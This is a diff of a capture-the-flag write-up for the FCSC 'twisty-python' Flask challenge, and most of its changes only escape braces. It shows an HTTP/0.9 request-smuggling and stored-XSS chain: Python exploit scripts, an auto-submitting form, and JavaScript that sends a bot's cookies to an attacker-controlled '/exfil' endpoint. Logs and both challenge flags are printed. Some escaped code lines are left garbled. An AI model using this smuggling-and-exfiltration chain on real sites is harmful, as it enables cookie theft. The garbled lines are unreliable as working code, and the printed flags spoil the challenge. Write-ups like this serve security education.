@@ -61,7 +61,7 @@ def visit(url):
     driver.set_page_load_timeout(3)
 
     driver.get("http://127.0.0.1:8000")
-    driver.add_cookie({
+    driver.add_cookie(\{
         "name": "flag_medium",
         "value": environ.get("FLAG_MEDIUM"),
         "path": "/",
@@ -69,7 +69,7 @@ def visit(url):
         "samesite": "Strict",
         "domain": "127.0.0.1"
     })
-    driver.add_cookie({
+    driver.add_cookie(\{
         "name": "flag_hard",
         "value": environ.get("FLAG_HARD"),
         "path": "/",
@@ -122,33 +122,33 @@ def note():
     init(session)
     action = request.args.get("action")
     if not action:
-        return jsonify({"error": "?action= must be set!"})
+        return jsonify(\{"error": "?action= must be set!"})
 
     if action == "color":
         res = Response(request.args.get("callback"))
         res.headers["Content-Type"] = "text/plain"
-        res.headers["Set-Cookie"] = f"color={request.args.get('color', 'red')}"
+        res.headers["Set-Cookie"] = f"color=\{request.args.get('color', 'red')}"
         return res
 
     if action == "add":
         if not request.method == "POST":
-            return jsonify({"error": "invalid HTTP method"})
+            return jsonify(\{"error": "invalid HTTP method"})
 
         d = request.form if request.form else request.get_json()
         if not ("name" in d and "score" in d):
-            return jsonify({"error": "name and score must be set"})
+            return jsonify(\{"error": "name and score must be set"})
 
-        session["scores"] += [{
+        session["scores"] += [\{
             "name": d["name"],
             "score": d["score"]
         }]
-        return jsonify({"length": len(session["scores"])})
+        return jsonify(\{"length": len(session["scores"])})
 
     if action == "view":
         raw = request.args.get("raw", False)
 
         if raw:
-            res = Response("".join([ f"{v['name']} -> {v['score']}\n" for v in session["scores"] ]))
+            res = Response("".join([ f"\{v['name']} -> \{v['score']}\n" for v in session["scores"] ]))
             res.headers["Content-Type"] = "text/plain"
         else:
             res = jsonify(session["scores"])
@@ -157,9 +157,9 @@ def note():
 
     if action == "clear":
         session.clear()
-        return jsonify({"clear": True})
+        return jsonify(\{"clear": True})
 
-    return jsonify({"error": "invalid action value (color || add || view || clear)"})
+    return jsonify(\{"error": "invalid action value (color || add || view || clear)"})
 ```
 The rest of the application is marked as useless for solving the challenge (*Example: main.js, index.html*). 
 The application is an implementation of the snake game, where you can save your scores and display them in a global scoreboard. You can also change the background color.  
@@ -182,17 +182,17 @@ It's important to keep in mind all the possible options for calling these action
 #### Action: *add*
 ```python
 if not request.method == "POST":
-    return jsonify({"error": "invalid HTTP method"})
+    return jsonify(\{"error": "invalid HTTP method"})
     
 d = request.form if request.form else request.get_json()
 if not ("name" in d and "score" in d):
-    return jsonify({"error": "name and score must be set"})
+    return jsonify(\{"error": "name and score must be set"})
 
-session["scores"] += [{
+session["scores"] += [\{
     "name": d["name"],
     "score": d["score"]
 }]
-return jsonify({"length": len(session["scores"])})
+return jsonify(\{"length": len(session["scores"])})
 ``` 
 
 Remember that: 
@@ -206,7 +206,7 @@ Remember that:
 
 ```python
 session.clear()
-return jsonify({"clear": True})
+return jsonify(\{"clear": True})
 ```
 
 It simply allows you to have a session with an empty scoreboard.  
@@ -216,7 +216,7 @@ It simply allows you to have a session with an empty scoreboard.
 ```python
 raw = request.args.get("raw", False)
 if raw:
-    res = Response("".join([ f"{v['name']} -> {v['score']}\n" for v in session["scores"] ]))
+    res = Response("".join([ f"\{v['name']} -> \{v['score']}\n" for v in session["scores"] ]))
     res.headers["Content-Type"] = "text/plain"
 else:
     res = jsonify(session["scores"])
@@ -230,7 +230,7 @@ This option takes an optional *raw* parameter and returns, in text or json, the 
 ```python
 res = Response(request.args.get("callback"))
 res.headers["Content-Type"] = "text/plain"
-res.headers["Set-Cookie"] = f"color={request.args.get('color', 'red')}"
+res.headers["Set-Cookie"] = f"color=\{request.args.get('color', 'red')}"
 return res
 ```
 
@@ -394,7 +394,7 @@ POST /api?action=color&color=%ef%bf%bf HTTP/1.1\r
 Host: localhost:8000\r
 Content-Length: 500\r
 \r
-GET /api?action=color&callback={response} HTTP/0.9\r
+GET /api?action=color&callback=\{response} HTTP/0.9\r
 User-Agent: vozec\r
 \r
 \r
@@ -420,7 +420,7 @@ import requests
 ...
 def get_session(payload):
     url = 'http://localhost:8000'
-    res =  requests.post(f'{url}/api?action=add', data={
+    res =  requests.post(f'\{url}/api?action=add', data=\{
         "name": payload,
         "score": "a"
     })
@@ -438,7 +438,7 @@ Content-Length: 500\r
 \r
 GET /api?action=view&raw=1 HTTP/0.9\r
 User-Agent: vozec\r
-Cookie: session={get_session(response)}
+Cookie: session=\{get_session(response)}
 \r
 \r
 '''[1:-1].encode()
@@ -486,7 +486,7 @@ app = Flask(__name__)
 def get_session(payload):
     # url = 'https://twisty-python.france-cybersecurity-challenge.fr'
     url = 'http://localhost:8000'
-    res =  requests.post(f'{url}/api?action=add', data={
+    res =  requests.post(f'\{url}/api?action=add', data=\{
         "name": payload,
         "score": "a"
     })
@@ -519,7 +519,7 @@ session = get_session(response)
 smuggled = f'''
 GET /api?action=view&raw=1 HTTP/0.9\r
 User-Agent: vozec\r
-Cookie: session={session};\r
+Cookie: session=\{session};\r
 \r
 '''[1:]
 
@@ -530,7 +530,7 @@ def index():
 <html>
     <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"> 
     <form action="http://127.0.0.1:8000/api?action=color&color=%ef%bf%bf" method="POST" enctype='text/plain'>
-        <textarea name="{smuggled}"></textarea>
+        <textarea name="\{smuggled}"></textarea>
     </form>
     <script>
         document.forms[0].submit();
@@ -610,12 +610,12 @@ Press CTRL+C to quit
  * Debugger PIN: 516-152-805
 172.18.224.1 - - [08/Apr/2024 19:58:08] "GET / HTTP/1.1" 200 -
 ####################################################################################################
-flag_medium=FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}
+flag_medium=FCSC\{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}
 ####################################################################################################
 172.18.224.1 - - [08/Apr/2024 19:58:08] "GET /exfil?data=ZmxhZ19tZWRpdW09RkNTQ3tlYzBmNGYyY2Q0MTdmMDc4OGVmZDkwOTc2N2IwYzI2OTBmMTFiZWRiNDE4YjJkNzc3M2U2YzlhNjUzN2M3YTI2fQ== HTTP/1.1" 200 -
 ```
 
-Flag: ``FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}``
+Flag: ``FCSC\{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}``
 
 
 ## Second exploitation.
@@ -693,7 +693,7 @@ We can update our javascript code like this:
 - We retrieve the page which is saved in the scoreboard
 - We exfiltrate the flag.
 
-In order to keep the same TCP connection, I use the javascript ``fetch`` function and chain it with ``.then(response => { })``
+In order to keep the same TCP connection, I use the javascript ``fetch`` function and chain it with ``.then(response => \{ })``
 
 Here is the form of the full exploit from xss:
 ```
@@ -770,7 +770,7 @@ mon_ip = '<ip>:3333'
 def get_session(payload):
     url = 'https://twisty-python.france-cybersecurity-challenge.fr'
     # url = 'http://localhost:8000'
-    res =  requests.post(f'{url}/api?action=add', data={
+    res =  requests.post(f'\{url}/api?action=add', data=\{
         "name": payload,
         "score": "ez"
     })
@@ -799,7 +799,7 @@ Content-Length: LENGTH_HERE\r
 <!DOCTYPE html>
 <body>
     <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
-    <script src='http://{mon_ip}/js'></script>
+    <script src='http://\{mon_ip}/js'></script>
 </body>
 \r
 '''[1:]
@@ -808,7 +808,7 @@ xss_html = xss_html.replace('LENGTH_HERE', str(len(xss_html)-xss_html.index('<!D
 
 smuggled = f'''
 GET /api?action=view&raw=1\r
-Cookie: session={get_session(xss_html)};\r
+Cookie: session=\{get_session(xss_html)};\r
 \r
 '''[1:]
 
@@ -816,7 +816,7 @@ payload = f'''
 <html>
     <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"> 
     <form action="http://127.0.0.1:8000/api?action=color&color=%ef%bf%bf&callback=a" method="POST" enctype='text/plain'>
-        <textarea name="{smuggled}"></textarea>
+        <textarea name="\{smuggled}"></textarea>
     </form>
     <script>
         document.forms[0].submit();
@@ -827,36 +827,36 @@ payload = f'''
 @app.route("/js")
 def js():
     payload = f'''
-fetch("/api?action=clear").then(response => {{
+fetch("/api?action=clear").then(response => \{\{
 
     history.pushState(null,null,'/')
 
-    fetch("/api?action=color&color=%ef%bf%bf&callback="+"x".repeat(25), {{
+    fetch("/api?action=color&color=%ef%bf%bf&callback="+"x".repeat(25), \{\{
         method: "POST",
         mode: "no-cors",
         credentials: "include",
         keepAlive: true,
-        body: atob('\{smuggled_self\}')
+        body: atob('\{smuggled_self}')
     }})
-    .then(response => {{
+    .then(response => \{\{
 
-        fetch("/", {{
+        fetch("/", \{\{
             method: "GET",
             mode: "cors",
             credentials: "include",
             keepAlive: true,
         }})
-        .then(response => {{
+        .then(response => \{\{
 
-            fetch("/api?action=view&raw=1", {{
+            fetch("/api?action=view&raw=1", \{\{
                 method: "GET",
                 mode: "cors",
                 credentials: "include",
                 keepAlive: true
             }})
             .then(response => response.text())
-            .then(text => {{
-                document.location='http://\{mon_ip\}/exfil?data='.concat(btoa(text))
+            .then(text => \{\{
+                document.location='http://\\{mon_ip\}/exfil?data='.concat(btoa(text))
             }})
 
         }})
@@ -905,13 +905,13 @@ Sec-Fetch-Dest: empty\r
 Referer: http://127.0.0.1:8000/\r
 Accept-Encoding: gzip, deflate, br\r
 
-Cookie: flag_medium=FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}; flag_hard=FCSC{a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e}\r
+Cookie: flag_medium=FCSC\{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}; flag_hard=FCSC\{a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e}\r
 \r
 ####################################################################################################
 172.18.224.1 - - [12/Apr/2024 15:24:17] "GET /exfil?data=bWUgLT4gCkdFVCAvIEhUVFAvMS4xDQpIb3N0OiAxMjcuMC4wLjE6ODAwMA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0Kc2VjLWNoLXVhOiAiSGVhZGxlc3NDaHJvbWUiO3Y9IjEyMyIsICJOb3Q6QS1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTIzIg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgSGVhZGxlc3NDaHJvbWUvMTIzLjAuNjMxMi4xMDUgU2FmYXJpLzUzNy4zNg0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQ6ICovKg0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGVtcHR5DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjgwMDAvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IGZsYWdfbWVkaXVtPUZDU0N7ZWMwZjRmMmNkNDE3ZjA3ODhlZmQ5MDk3NjdiMGMyNjkwZjExYmVkYjQxOGIyZDc3NzNlNmM5YTY1MzdjN2EyNn07IGZsYWdfaGFyZD1GQ1NDe2EyN2Q4MjA0NTA2NDQ0NDVkZGE2NzU3YjhkMDE3OTM0NTZlNjMwOGExYzA0YmViYWY1YjQzNDYyNTEyOTE1OWV9DQoNCg== HTTP/1.1" 200 -
 ```
 
-We have: ``flag_hard=FCSC{a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e}``
+We have: ``flag_hard=FCSC\{a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e}``
 
 # Conclusion
 
